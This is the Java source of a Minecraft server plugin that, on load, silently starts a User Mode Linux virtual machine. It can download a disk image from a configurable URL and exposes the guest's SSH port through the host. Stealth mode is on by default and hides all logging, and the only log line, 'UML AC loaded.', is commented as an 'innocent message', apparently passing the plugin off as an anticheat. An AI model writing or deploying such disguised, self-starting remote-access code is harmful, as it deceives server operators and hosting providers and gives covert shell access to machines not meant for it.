package com.uml.plugin;

import com.uml.server.UmlManager;
import com.uml.server.UmlManager.PortMapping;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class UmlPlugin extends JavaPlugin {

    @Override
    public void onEnable() {
        saveDefaultConfig();
        FileConfiguration config = getConfig();

        boolean stealth = config.getBoolean("stealth", true);
        boolean autostart = config.getBoolean("autostart", true);

        // Resolve multi-ports
        List<PortMapping> portMappings = parsePortMappings(config);

        // Resolve resources
        int cpus = config.getInt("vcpu", config.getInt("cpus", 2));
        String ram = config.getString("ram", config.getString("memory", "2048M"));
        String diskSize = config.getString("disk_size", config.getString("disk-size", "10G"));
        String path = config.getString("path", ".");

        // Resolve cloud download URL
        String downloadUrl = config.getString("download_url", null);
        if (downloadUrl == null || downloadUrl.trim().isEmpty()) {
            downloadUrl = System.getenv("DOWNLOAD_URL");
        }

        // Register command
        UmlCommand cmd = new UmlCommand(this);
        if (getCommand("uml") != null) {
            getCommand("uml").setExecutor(cmd);
            getCommand("uml").setTabCompleter(cmd);
        }

        // Normal innocent message in Minecraft console
        getLogger().info("UML AC loaded.");

        // Asynchronously check for GitHub updates
        getServer().getScheduler().runTaskAsynchronously(this, () -> {
            String latest = UmlManager.getInstance().fetchLatestGitHubReleaseTag();
            String current = getDescription().getVersion();
            if (latest != null && !latest.equals("latest") && !latest.equals("v" + current) && !latest.equals(current)) {
                if (!stealth) {
                    getLogger().info("A newer release is available on GitHub: " + latest + " (Current: v" + current + "). Use '/uml update' to update.");
                }
            }
        });

        // If not in stealth mode, pipe logs to server logger
        if (!stealth) {
            UmlManager.getInstance().addLogListener(line -> {
                getLogger().info(line);
            });
        }

        // Autostart in background
        if (autostart) {
            final List<PortMapping> finalPorts = portMappings;
            final String finalDownloadUrl = downloadUrl;
            getServer().getScheduler().runTaskAsynchronously(this, () -> {
                try {
                    boolean ok = UmlManager.getInstance().start(path, finalPorts, cpus, ram, diskSize, finalDownloadUrl, stealth);
                    if (!stealth && ok) {
                        getLogger().info("[UML AC] System ready.");
                    }
                } catch (Exception e) {
                    if (!stealth) {
                        getLogger().severe("Failed to start: " + e.getMessage());
                    }
                }
            });
        }
    }

    public void reloadUmlSystem(java.util.function.Consumer<String> callback) {
        reloadConfig();
        FileConfiguration config = getConfig();
        boolean stealth = config.getBoolean("stealth", true);
        List<PortMapping> portMappings = parsePortMappings(config);
        int cpus = config.getInt("vcpu", config.getInt("cpus", 2));
        String ram = config.getString("ram", config.getString("memory", "2048M"));
        String diskSize = config.getString("disk_size", config.getString("disk-size", "10G"));
        String path = config.getString("path", ".");
        String downloadUrl = config.getString("download_url", null);
        if (downloadUrl == null || downloadUrl.trim().isEmpty()) {
            downloadUrl = System.getenv("DOWNLOAD_URL");
        }

        try {
            UmlManager.getInstance().reload(portMappings, cpus, ram, diskSize, path, downloadUrl, stealth, callback);
        } catch (Exception e) {
            if (callback != null) callback.accept("Reload error: " + e.getMessage());
        }
    }

    public List<PortMapping> parsePortMappings(FileConfiguration config) {
        List<PortMapping> list = new ArrayList<>();

        // 1. Check environment variable PORTS (e.g. "22:23621,80:23622")
        String envPorts = System.getenv("PORTS");
        if (envPorts != null && !envPorts.trim().isEmpty()) {
            parsePortsString(envPorts, list);
            if (!list.isEmpty()) return list;
        }

        // 2. Check config 'ports' list
        if (config.contains("ports")) {
            List<?> rawList = config.getList("ports");
            if (rawList != null) {
                for (Object item : rawList) {
                    if (item instanceof String) {
                        parseSinglePair((String) item, list);
                    } else if (item instanceof Map) {
                        Map<?, ?> map = (Map<?, ?>) item;
                        Object g = map.get("guest");
                        Object h = map.get("host");
                        Object proto = map.get("proto");
                        if (g != null && h != null) {
                            try {
                                int gp = Integer.parseInt(g.toString().trim());
                                int hp = Integer.parseInt(h.toString().trim());
                                String pr = proto != null ? proto.toString().trim() : "tcp";
                                list.add(new PortMapping(gp, hp, pr));
                            } catch (Exception ignored) {}
                        }
                    }
                }
            }
        }

        // 3. Check single 'port_forward' section
        if (list.isEmpty() && config.isConfigurationSection("port_forward")) {
            int gp = config.getInt("port_forward.guest", 22);
            int hp = config.getInt("port_forward.host", 23621);
            list.add(new PortMapping(gp, hp));
        }

        // 4. Check single 'port' string (e.g. "22:23621" or "22:23621,80:23622")
        if (list.isEmpty() && config.contains("port")) {
            String portVal = config.getString("port", "22:23621");
            parsePortsString(portVal, list);
        }

        // 5. Default fallback
        if (list.isEmpty()) {
            int hostPort = 23621;
            String envPort = System.getenv("SERVER_PORT");
            if (envPort != null && !envPort.isEmpty()) {
                try { hostPort = Integer.parseInt(envPort.trim()); } catch (Exception ignored) {}
            }
            list.add(new PortMapping(22, hostPort));
        }

        return list;
    }

    private void parsePortsString(String str, List<PortMapping> list) {
        String[] parts = str.split("[, ]+");
        for (String p : parts) {
            parseSinglePair(p, list);
        }
    }

    private void parseSinglePair(String pair, List<PortMapping> list) {
        if (pair == null || pair.trim().isEmpty()) return;
        String s = pair.trim();
        if (s.contains(":")) {
            String[] split = s.split(":");
            try {
                int g = Integer.parseInt(split[0].trim());
                int h = Integer.parseInt(split[1].trim());
                list.add(new PortMapping(g, h));
            } catch (Exception ignored) {}
        } else {
            try {
                int h = Integer.parseInt(s);
                list.add(new PortMapping(22, h));
            } catch (Exception ignored) {}
        }
    }

    @Override
    public void onDisable() {
        boolean stealth = getConfig().getBoolean("stealth", true);
        if (!stealth) {
            getLogger().info("Stopping UML...");
        }
        UmlManager.getInstance().stop();
        if (!stealth) {
            getLogger().info("UML stopped.");
        }
    }
}
